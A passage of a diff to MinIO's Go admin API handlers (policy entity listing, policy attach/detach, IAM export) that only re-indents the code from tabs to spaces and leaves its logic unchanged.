}\n \n // ListPolicyMappingEntities - GET /minio/admin/v3/idp/builtin/polciy-entities?policy=xxx&user=xxx&group=xxx\n func (a adminAPIHandlers) ListPolicyMappingEntities(w http.ResponseWriter, r *http.Request) {\n-\tctx := r.Context()\n-\n-\t// Check authorization.\n-\tobjectAPI, cred := validateAdminReq(ctx, w, r,\n-\t\tpolicy.ListGroupsAdminAction, policy.ListUsersAdminAction, policy.ListUserPoliciesAdminAction)\n-\tif objectAPI == nil {\n-\t\treturn\n-\t}\n-\n-\t// Validate API arguments.\n-\tq := madmin.PolicyEntitiesQuery{\n-\t\tUsers:  r.Form[\"user\"],\n-\t\tGroups: r.Form[\"group\"],\n-\t\tPolicy: r.Form[\"policy\"],\n-\t}\n-\n-\t// Query IAM\n-\tres, err := globalIAMSys.QueryPolicyEntities(r.Context(), q)\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\n-\t// Encode result and send response.\n-\tdata, err := json.Marshal(res)\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\tpassword := cred.SecretKey\n-\teconfigData, err := madmin.EncryptData(password, data)\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\twriteSuccessResponseJSON(w, econfigData)\n+        ctx := r.Context()\n+\n+        // Check authorization.\n+        objectAPI, cred := validateAdminReq(ctx, w, r,\n+                policy.ListGroupsAdminAction, policy.ListUsersAdminAction, policy.ListUserPoliciesAdminAction)\n+        if objectAPI == nil {\n+                return\n+        }\n+\n+        // Validate API arguments.\n+        q := madmin.PolicyEntitiesQuery{\n+                Users:  r.Form[\"user\"],\n+                Groups: r.Form[\"group\"],\n+                Policy: r.Form[\"policy\"],\n+        }\n+\n+        // Query IAM\n+        res, err := globalIAMSys.QueryPolicyEntities(r.Context(), q)\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+\n+        // Encode result and send response.\n+        data, err := json.Marshal(res)\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+        password := cred.SecretKey\n+        econfigData, err := madmin.EncryptData(password, data)\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+        writeSuccessResponseJSON(w, econfigData)\n }\n \n // AttachDetachPolicyBuiltin - POST /minio/admin/v3/idp/builtin/policy/{operation}\n func (a adminAPIHandlers) AttachDetachPolicyBuiltin(w http.ResponseWriter, r *http.Request) {\n-\tctx := r.Context()\n-\n-\tobjectAPI, cred := validateAdminReq(ctx, w, r, policy.UpdatePolicyAssociationAction,\n-\t\tpolicy.AttachPolicyAdminAction)\n-\tif objectAPI == nil {\n-\t\treturn\n-\t}\n-\n-\tif r.ContentLength > maxEConfigJSONSize || r.ContentLength == -1 {\n-\t\t// More than maxConfigSize bytes were available\n-\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAdminConfigTooLarge), r.URL)\n-\t\treturn\n-\t}\n-\n-\t// Ensure body content type is opaque to ensure that request body has not\n-\t// been interpreted as form data.\n-\tcontentType := r.Header.Get(\"Content-Type\")\n-\tif contentType != \"application/octet-stream\" {\n-\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrBadRequest), r.URL)\n-\t\treturn\n-\t}\n-\n-\toperation := mux.Vars(r)[\"operation\"]\n-\tif operation != \"attach\" && operation != \"detach\" {\n-\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAdminInvalidArgument), r.URL)\n-\t\treturn\n-\t}\n-\tisAttach := operation == \"attach\"\n-\n-\tpassword := cred.SecretKey\n-\treqBytes, err := madmin.DecryptData(password, io.LimitReader(r.Body, r.ContentLength))\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\n-\tvar par madmin.PolicyAssociationReq\n-\tif err = json.Unmarshal(reqBytes, &par); err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\n-\tif err = par.IsValid(); err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\n-\tupdatedAt, addedOrRemoved, _, err := globalIAMSys.PolicyDBUpdateBuiltin(ctx, isAttach, par)\n-\tif err != nil {\n-\t\tif err == errNoSuchUser || err == errNoSuchGroup {\n-\t\t\tif globalIAMSys.LDAPConfig.Enabled() {\n-\t\t\t\t// When LDAP is enabled, warn user that they are using the wrong\n-\t\t\t\t// API. FIXME: error can be no such group as well - fix errNoSuchUserLDAPWarn\n-\t\t\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, errNoSuchUserLDAPWarn), r.URL)\n-\t\t\t\treturn\n-\t\t\t}\n-\t\t}\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\n-\trespBody := madmin.PolicyAssociationResp{\n-\t\tUpdatedAt: updatedAt,\n-\t}\n-\tif isAttach {\n-\t\trespBody.PoliciesAttached = addedOrRemoved\n-\t} else {\n-\t\trespBody.PoliciesDetached = addedOrRemoved\n-\t}\n-\n-\tdata, err := json.Marshal(respBody)\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\n-\tencryptedData, err := madmin.EncryptData(password, data)\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\n-\twriteSuccessResponseJSON(w, encryptedData)\n+        ctx := r.Context()\n+\n+        objectAPI, cred := validateAdminReq(ctx, w, r, policy.UpdatePolicyAssociationAction,\n+                policy.AttachPolicyAdminAction)\n+        if objectAPI == nil {\n+                return\n+        }\n+\n+        if r.ContentLength > maxEConfigJSONSize || r.ContentLength == -1 {\n+                // More than maxConfigSize bytes were available\n+                writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAdminConfigTooLarge), r.URL)\n+                return\n+        }\n+\n+        // Ensure body content type is opaque to ensure that request body has not\n+        // been interpreted as form data.\n+        contentType := r.Header.Get(\"Content-Type\")\n+        if contentType != \"application/octet-stream\" {\n+                writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrBadRequest), r.URL)\n+                return\n+        }\n+\n+        operation := mux.Vars(r)[\"operation\"]\n+        if operation != \"attach\" && operation != \"detach\" {\n+                writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAdminInvalidArgument), r.URL)\n+                return\n+        }\n+        isAttach := operation == \"attach\"\n+\n+        password := cred.SecretKey\n+        reqBytes, err := madmin.DecryptData(password, io.LimitReader(r.Body, r.ContentLength))\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+\n+        var par madmin.PolicyAssociationReq\n+        if err = json.Unmarshal(reqBytes, &par); err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+\n+        if err = par.IsValid(); err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+\n+        updatedAt, addedOrRemoved, _, err := globalIAMSys.PolicyDBUpdateBuiltin(ctx, isAttach, par)\n+        if err != nil {\n+                if err == errNoSuchUser || err == errNoSuchGroup {\n+                        if globalIAMSys.LDAPConfig.Enabled() {\n+                                // When LDAP is enabled, warn user that they are using the wrong\n+                                // API. FIXME: error can be no such group as well - fix errNoSuchUserLDAPWarn\n+                                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, errNoSuchUserLDAPWarn), r.URL)\n+                                return\n+                        }\n+                }\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+\n+        respBody := madmin.PolicyAssociationResp{\n+                UpdatedAt: updatedAt,\n+        }\n+        if isAttach {\n+                respBody.PoliciesAttached = addedOrRemoved\n+        } else {\n+                respBody.PoliciesDetached = addedOrRemoved\n+        }\n+\n+        data, err := json.Marshal(respBody)\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+\n+        encryptedData, err := madmin.EncryptData(password, data)\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+\n+        writeSuccessResponseJSON(w, encryptedData)\n }\n \n const (\n-\tallPoliciesFile            = \"policies.json\"\n-\tallUsersFile               = \"users.json\"\n-\tallGroupsFile              = \"groups.json\"\n-\tallSvcAcctsFile            = \"svcaccts.json\"\n-\tuserPolicyMappingsFile     = \"user_mappings.json\"\n-\tgroupPolicyMappingsFile    = \"group_mappings.json\"\n-\tstsUserPolicyMappingsFile  = \"stsuser_mappings.json\"\n-\tstsGroupPolicyMappingsFile = \"stsgroup_mappings.json\"\n-\tiamAssetsDir               = \"iam-assets\"\n+        allPoliciesFile            = \"policies.json\"\n+        allUsersFile               = \"users.json\"\n+        allGroupsFile              = \"groups.json\"\n+        allSvcAcctsFile            = \"svcaccts.json\"\n+        userPolicyMappingsFile     = \"user_mappings.json\"\n+        groupPolicyMappingsFile    = \"group_mappings.json\"\n+        stsUserPolicyMappingsFile  = \"stsuser_mappings.json\"\n+        stsGroupPolicyMappingsFile = \"stsgroup_mappings.json\"\n+        iamAssetsDir               = \"iam-assets\"\n )\n \n // ExportIAMHandler - exports all iam info as a zipped file\n func (a adminAPIHandlers) ExportIAM(w http.ResponseWriter, r *http.Request) {\n-\tctx := r.Context()\n-\n-\t// Get current object layer instance.\n-\tobjectAPI, _ := validateAdminReq(ctx, w, r, policy.ExportIAMAction)\n-\tif objectAPI == nil {\n-\t\treturn\n-\t}\n-\t// Initialize a zip writer which will provide a zipped content\n-\t// of bucket metadata\n-\tzipWriter := zip.NewWriter(w)\n-\tdefer zipWriter.Close()\n-\trawDataFn := func(r io.Reader, filename string, sz int) error {\n-\t\theader, zerr := zip.FileInfoHeader(dummyFileInfo{\n-\t\t\tname:    filename,\n-\t\t\tsize:    int64(sz),\n-\t\t\tmode:    0o600,\n-\t\t\tmodTime: time.Now(),\n-\t\t\tisDir:   false,\n-\t\t\tsys:     nil,\n-\t\t})\n-\t\tif zerr != nil {\n-\t\t\tlogger.LogIf(ctx, zerr)\n-\t\t\treturn nil\n-\t\t}\n-\t\theader.Method = zip.Deflate\n-\t\tzwriter, zerr := zipWriter.CreateHeader(header)\n-\t\tif zerr != nil {\n-\t\t\tlogger.LogIf(ctx, zerr)\n-\t\t\treturn nil\n-\t\t}\n-\t\tif _, err := io.Copy(zwriter, r); err != nil {\n-\t\t\tlogger.LogIf(ctx, err)\n-\t\t}\n-\t\treturn nil\n-\t}\n-\n-\tiamFiles := []string{\n-\t\tallPoliciesFile,\n-\t\tallUsersFile,\n-\t\tallGroupsFile,\n-\t\tallSvcAcctsFile,\n-\t\tuserPolicyMappingsFile,\n-\t\tgroupPolicyMappingsFile,\n-\t\tstsUserPolicyMappingsFile,\n-\t\tstsGroupPolicyMappingsFile,\n-\t}\n-\tfor _, f := range iamFiles {\n-\t\tiamFile := pathJoin(iamAssetsDir, f)\n-\t\tswitch f {\n-\t\tcase allPoliciesFile:\n-\t\t\tallPolicies, err := globalIAMSys.ListPolicies(ctx, \"\")\n-\t\t\tif err != nil {\n-\t\t\t\tlogger.LogIf(ctx, err)\n-\t\t\t\twriteErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n-\t\t\t\treturn\n-\t\t\t}\n-\n-\t\t\tpoliciesData, err := json.Marshal(allPolicies)\n-\t\t\tif err != nil {\n-\t\t\t\twriteErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n-\t\t\t\treturn\n-\t\t\t}\n-\t\t\tif err = rawDataFn(bytes.NewReader(policiesData), iamFile, len(policiesData)); err != nil {\n-\t\t\t\twriteErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n-\t\t\t\treturn\n-\t\t\t}\n-\t\tcase allUsersFile:\n-\t\t\tuserIdentities := make(map[string]UserIdentity)\n-\t\t\terr := globalIAMSys.store.loadUsers(ctx, regUser, userIdentities)\n-\t\t\tif err != nil {\n-\t\t\t\twriteErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n-\t\t\t\treturn\n-\t\t\t}\n-\t\t\tuserAccounts := make(map[string]madmin.AddOrUpdateUserReq)\n-\t\t\tfor u, uid := range userIdentities {\n-\t\t\t\tuserAccounts[u] = madmin.AddOrUpdateUserReq{\n-\t\t\t\t\tSecretKey: uid.Credentials.SecretKey,\n-\t\t\t\t\tStatus: func() madmin.AccountStatus {\n-\t\t\t\t\t\t// Export current credential status\n-\t\t\t\t\t\tif uid.Credentials.Status == auth.AccountOff {\n-\t\t\t\t\t\t\treturn madmin.AccountDisabled\n-\t\t\t\t\t\t}\n-\t\t\t\t\t\treturn madmin.AccountEnabled\n-\t\t\t\t\t}(),\n-\t\t\t\t}\n-\t\t\t}\n-\t\t\tuserData, err := json.Marshal(userAccounts)\n-\t\t\tif err != nil {\n-\t\t\t\twriteErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n-\t\t\t\treturn\n-\t\t\t}\n-\n-\t\t\tif err = rawDataFn(bytes.NewReader(userData), iamFile, len(userData)); err != nil {\n-\t\t\t\twriteErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n-\t\t\t\treturn\n-\t\t\t}\n-\t\tcase allGroupsFile:\n-\t\t\tgroups := make(map[string]GroupInfo)\n-\t\t\terr := globalIAMSys.store.loadGroups(ctx, groups)\n-\t\t\tif err != nil {\n-\t\t\t\twriteErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n-\t\t\t\treturn\n-\t\t\t}\n-\t\t\tgroupData, err := json.Marshal(groups)\n-\t\t\tif err != nil {\n-\t\t\t\twriteErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n-\t\t\t\treturn\n-\t\t\t}\n-\n-\t\t\tif err = rawDataFn(bytes.NewReader(groupData), iamFile, len(groupData)); err != nil {\n-\t\t\t\twriteErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n-\t\t\t\treturn\n-\t\t\t}\n-\t\tcase allSvcAcctsFile:\n-\t\t\tserviceAccounts := make(map[string]UserIdentity)\n-\t\t\terr := globalIAMSys.store.loadUsers(ctx, svcUser, serviceAccounts)\n-\t\t\tif err != nil {\n-\t\t\t\twriteErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n-\t\t\t\treturn\n-\t\t\t}\n-\t\t\tsvcAccts := make(map[string]madmin.SRSvcAccCreate)\n-\t\t\tfor user, acc := range serviceAccounts {\n-\t\t\t\tif user == siteReplicatorSvcAcc {\n-\t\t\t\t\t// skip site-replication service account.\n-\t\t\t\t\tcontinue\n-\t\t\t\t}\n-\t\t\t\tclaims, err := globalIAMSys.GetClaimsForSvcAcc(ctx, acc.Credentials.AccessKey)\n-\t\t\t\tif err != nil {\n-\t\t\t\t\twriteErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n-\t\t\t\t\treturn\n-\t\t\t\t}\n-\t\t\t\t_, policy, err := globalIAMSys.GetServiceAccount(ctx, acc.Credentials.AccessKey)\n-\t\t\t\tif err != nil {\n-\t\t\t\t\twriteErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n-\t\t\t\t\treturn\n-\t\t\t\t}\n-\n-\t\t\t\tvar policyJSON []byte\n-\t\t\t\tif policy != nil {\n-\t\t\t\t\tpolicyJSON, err = json.Marshal(policy)\n-\t\t\t\t\tif err != nil {\n-\t\t\t\t\t\twriteErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n-\t\t\t\t\t\treturn\n-\t\t\t\t\t}\n-\t\t\t\t}\n-\t\t\t\tsvcAccts[user] = madmin.SRSvcAccCreate{\n-\t\t\t\t\tParent:        acc.Credentials.ParentUser,\n-\t\t\t\t\tAccessKey:     user,\n-\t\t\t\t\tSecretKey:     acc.Credentials.SecretKey,\n-\t\t\t\t\tGroups:        acc.Credentials.Groups,\n-\t\t\t\t\tClaims:        claims,\n-\t\t\t\t\tSessionPolicy: json.RawMessage(policyJSON),\n-\t\t\t\t\tStatus:        acc.Credentials.Status,\n-\t\t\t\t}\n-\t\t\t}\n-\n-\t\t\tsvcAccData, err := json.Marshal(svcAccts)\n-\t\t\tif err != nil {\n-\t\t\t\twriteErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n-\t\t\t\treturn\n-\t\t\t}\n-\n-\t\t\tif err = rawDataFn(bytes.NewReader(svcAccData), iamFile, len(svcAccData)); err != nil {\n-\t\t\t\twriteErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n-\t\t\t\treturn\n-\t\t\t}\n-\t\tcase userPolicyMappingsFile:\n-\t\t\tuserPolicyMap := make(map[string]MappedPolicy)\n-\t\t\terr := globalIAMSys.store.loadMappedPolicies(ctx, regUser, false, userPolicyMap)\n-\t\t\tif err != nil {\n-\t\t\t\twriteErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n-\t\t\t\treturn\n-\t\t\t}\n-\t\t\tuserPolData, err := json.Marshal(userPolicyMap)\n-\t\t\tif err != nil {\n-\t\t\t\twriteErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n-\t\t\t\treturn\n-\t\t\t}\n-\n-\t\t\tif err = rawDataFn(bytes.NewReader(userPolData), iamFile, len(userPolData)); err != nil {\n-\t\t\t\twriteErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n-\t\t\t\treturn\n-\t\t\t}\n-\t\tcase groupPolicyMappingsFile:\n-\t\t\tgroupPolicyMap := make(map[string]MappedPolicy)\n-\t\t\terr := globalIAMSys.store.loadMappedPolicies(ctx, regUser, true, groupPolicyMap)\n-\t\t\tif err != nil {\n-\t\t\t\twriteErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n-\t\t\t\treturn\n-\t\t\t}\n-\t\t\tgrpPolData, err := json.Marshal(groupPolicyMap)\n-\t\t\tif err != nil {\n-\t\t\t\twriteErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n-\t\t\t\treturn\n-\t\t\t}\n-\n-\t\t\tif err = rawDataFn(bytes.NewReader(grpPolData), iamFile, len(grpPolData)); err != nil {\n-\t\t\t\twriteErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n-\t\t\t\treturn\n-\t\t\t}\n-\t\tcase stsUserPolicyMappingsFile:\n-\t\t\tuserPolicyMap := make(map[string]MappedPolicy)\n-\t\t\terr := globalIAMSys.store.loadMappedPolicies(ctx, stsUser, false, userPolicyMap)\n-\t\t\tif err != nil {\n-\t\t\t\twriteErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n-\t\t\t\treturn\n-\t\t\t}\n-\t\t\tuserPolData, err := json.Marshal(userPolicyMap)\n-\t\t\tif err != nil {\n-\t\t\t\twriteErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n-\t\t\t\treturn\n-\t\t\t}\n-\t\t\tif err = rawDataFn(bytes.NewReader(userPolData), iamFile, len(userPolData)); err != nil {\n-\t\t\t\twriteErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n-\t\t\t\treturn\n-\t\t\t}\n-\t\tcase stsGroupPolicyMappingsFile:\n-\t\t\tgroupPolicyMap := make(map[string]MappedPolicy)\n-\t\t\terr := globalIAMSys.store.loadMappedPolicies(ctx, stsUser, true, groupPolicyMap)\n-\t\t\tif err != nil {\n-\t\t\t\twriteErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n-\t\t\t\treturn\n-\t\t\t}\n-\t\t\tgrpPolData, err := json.Marshal(groupPolicyMap)\n-\t\t\tif err != nil {\n-\t\t\t\twriteErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n-\t\t\t\treturn\n-\t\t\t}\n-\t\t\tif err = rawDataFn(bytes.NewReader(grpPolData), iamFile, len(grpPolData)); err != nil {\n-\t\t\t\twriteErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n-\t\t\t\treturn\n-\t\t\t}\n-\t\t}\n-\t}\n+        ctx := r.Context()\n+\n+        // Get current object layer instance.\n+        objectAPI, _ := validateAdminReq(ctx, w, r, policy.ExportIAMAction)\n+        if objectAPI == nil {\n+                return\n+        }\n+        // Initialize a zip writer which will provide a zipped content\n+        // of bucket metadata\n+        zipWriter := zip.NewWriter(w)\n+        defer zipWriter.Close()\n+        rawDataFn := func(r io.Reader, filename string, sz int) error {\n+                header, zerr := zip.FileInfoHeader(dummyFileInfo{\n+                        name:    filename,\n+                        size:    int64(sz),\n+                        mode:    0o600,\n+                        modTime: time.Now(),\n+                        isDir:   false,\n+                        sys:     nil,\n+                })\n+                if zerr != nil {\n+                        logger.LogIf(ctx, zerr)\n+                        return nil\n+                }\n+                header.Method = zip.Deflate\n+                zwriter, zerr := zipWriter.CreateHeader(header)\n+                if zerr != nil {\n+                        logger.LogIf(ctx, zerr)\n+                        return nil\n+                }\n+                if _, err := io.Copy(zwriter, r); err != nil {\n+                        logger.LogIf(ctx, err)\n+                }\n+                return nil\n+        }\n+\n+        iamFiles := []string{\n+                allPoliciesFile,\n+                allUsersFile,\n+                allGroupsFile,\n+                allSvcAcctsFile,\n+                userPolicyMappingsFile,\n+                groupPolicyMappingsFile,\n+                stsUserPolicyMappingsFile,\n+                stsGroupPolicyMappingsFile,\n+        }\n+        for _, f := range iamFiles {\n+                iamFile := pathJoin(iamAssetsDir, f)\n+                switch f {\n+                case allPoliciesFile:\n+                        allPolicies, err := globalIAMSys.ListPolicies(ctx, \"\")\n+                        if err != nil {\n+                                logger.LogIf(ctx, err)\n+                                writeErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n+                                return\n+                        }\n+\n+                        policiesData, err := json.Marshal(allPolicies)\n+                        if err != nil {\n+                                writeErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n+                                return\n+                        }\n+                        if err = rawDataFn(bytes.NewReader(policiesData), iamFile, len(policiesData)); err != nil {\n+                                writeErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n+                                return\n+                        }\n+                case allUsersFile:\n+                        userIdentities := make(map[string]UserIdentity)\n+                        err := globalIAMSys.store.loadUsers(ctx, regUser, userIdentities)\n+                        if err != nil {\n+                                writeErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n+                                return\n+                        }\n+                        userAccounts := make(map[string]madmin.AddOrUpdateUserReq)\n+                        for u, uid := range userIdentities {\n+                                userAccounts[u] = madmin.AddOrUpdateUserReq{\n+                                        SecretKey: uid.Credentials.SecretKey,\n+                                        Status: func() madmin.AccountStatus {\n+                                                // Export current credential status\n+                                                if uid.Credentials.Status == auth.AccountOff {\n+                                                        return madmin.AccountDisabled\n+                                                }\n+                                                return madmin.AccountEnabled\n+                                        }(),\n+                                }\n+                        }\n+                        userData, err := json.Marshal(userAccounts)\n+                        if err != nil {\n+                                writeErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n+                                return\n+                        }\n+\n+                        if err = rawDataFn(bytes.NewReader(userData), iamFile, len(userData)); err != nil {\n+                                writeErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n+                                return\n+                        }\n+                case allGroupsFile:\n+                        groups := make(map[string]GroupInfo)\n+                        err := globalIAMSys.store.loadGroups(ctx, groups)\n+                        if err != nil {\n+                                writeErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n+                                return\n+                        }\n+                        groupData, err := json.Marshal(groups)\n+                        if err != nil {\n+                                writeErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n+                                return\n+                        }\n+\n+                        if err = rawDataFn(bytes.NewReader(groupData), iamFile, len(groupData)); err != nil {\n+                                writeErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n+                                return\n+                        }\n+                case allSvcAcctsFile:\n+                        serviceAccounts := make(map[string]UserIdentity)\n+                        err := globalIAMSys.store.loadUsers(ctx, svcUser, serviceAccounts)\n+                        if err != nil {\n+                                writeErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n+                                return\n+                        }\n+                        svcAccts := make(map[string]madmin.SRSvcAccCreate)\n+                        for user, acc := range serviceAccounts {\n+                                if user == siteReplicatorSvcAcc {\n+                                        // skip site-replication service account.\n+                                        continue\n+                                }\n+                                claims, err := globalIAMSys.GetClaimsForSvcAcc(ctx, acc.Credentials.AccessKey)\n+                                if err != nil {\n+                                        writeErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n+                                        return\n+                                }\n+                                _, policy, err := globalIAMSys.GetServiceAccount(ctx, acc.Credentials.AccessKey)\n+                                if err != nil {\n+                                        writeErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n+                                        return\n+                                }\n+\n+                                var policyJSON []byte\n+                                if policy != nil {\n+                                        policyJSON, err = json.Marshal(policy)\n+                                        if err != nil {\n+                                                writeErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n+                                                return\n+                                        }\n+                                }\n+                                svcAccts[user] = madmin.SRSvcAccCreate{\n+                                        Parent:        acc.Credentials.ParentUser,\n+                                        AccessKey:     user,\n+                                        SecretKey:     acc.Credentials.SecretKey,\n+                                        Groups:        acc.Credentials.Groups,\n+                                        Claims:        claims,\n+                                        SessionPolicy: json.RawMessage(policyJSON),\n+                                        Status:        acc.Credentials.Status,\n+                                }\n+                        }\n+\n+                        svcAccData, err := json.Marshal(svcAccts)\n+                        if err != nil {\n+                                writeErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n+                                return\n+                        }\n+\n+                        if err = rawDataFn(bytes.NewReader(svcAccData), iamFile, len(svcAccData)); err != nil {\n+                                writeErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n+                                return\n+                        }\n+                case userPolicyMappingsFile:\n+                        userPolicyMap := make(map[string]MappedPolicy)\n+                        err := globalIAMSys.store.loadMappedPolicies(ctx, regUser, false, userPolicyMap)\n+                        if err != nil {\n+                                writeErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n+                                return\n+                        }\n+                        userPolData, err := json.Marshal(userPolicyMap)\n+                        if err != nil {\n+                                writeErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n+                                return\n+                        }\n+\n+                        if err = rawDataFn(bytes.NewReader(userPolData), iamFile, len(userPolData)); err != nil {\n+                                writeErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n+                                return\n+                        }\n+                case groupPolicyMappingsFile:\n+                        groupPolicyMap := make(map[string]MappedPolicy)\n+                        err := globalIAMSys.store.loadMappedPolicies(ctx, regUser, true, groupPolicyMap)\n+                        if err != nil {\n+                                writeErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n+                                return\n+                        }\n+                        grpPolData, err := json.Marshal(groupPolicyMap)\n+                        if err != nil {\n+                                writeErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n+                                return\n+                        }\n+\n+                        if err = rawDataFn(bytes.NewReader(grpPolData), iamFile, len(grpPolData)); err != nil {\n+                                writeErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n+                                return\n+                        }\n+                case stsUserPolicyMappingsFile:\n+                        userPolicyMap := make(map[string]MappedPolicy)\n+                        err := globalIAMSys.store.loadMappedPolicies(ctx, stsUser, false, userPolicyMap)\n+                        if err != nil {\n+                                writeErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n+                                return\n+                        }\n+                        userPolData, err := json.Marshal(userPolicyMap)\n+                        if err != nil {\n+                                writeErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n+                                return\n+                        }\n+                        if err = rawDataFn(bytes.NewReader(userPolData), iamFile, len(userPolData)); err != nil {\n+                                writeErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n+                                return\n+                        }\n+                case stsGroupPolicyMappingsFile:\n+                        groupPolicyMap := make(map[string]MappedPolicy)\n+                        err := globalIAMSys.store.loadMappedPolicies(ctx, stsUser, true, groupPolicyMap)\n+                        if err != nil {\n+                                writeErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n+                                return\n+                        }\n+                        grpPolData, err := json.Marshal(groupPolicyMap)\n+                        if err != nil {\n+                                writeErrorResponse(ctx, w, exportError(ctx, err, iamFile, \"\"), r.URL)\n+                                return\n+                        }\n+                        if err = rawDataFn(bytes.NewReader(grpPolData), iamFile, len(grpPolData)); err != nil {\n+                                writeErrorResponse(ctx, w, 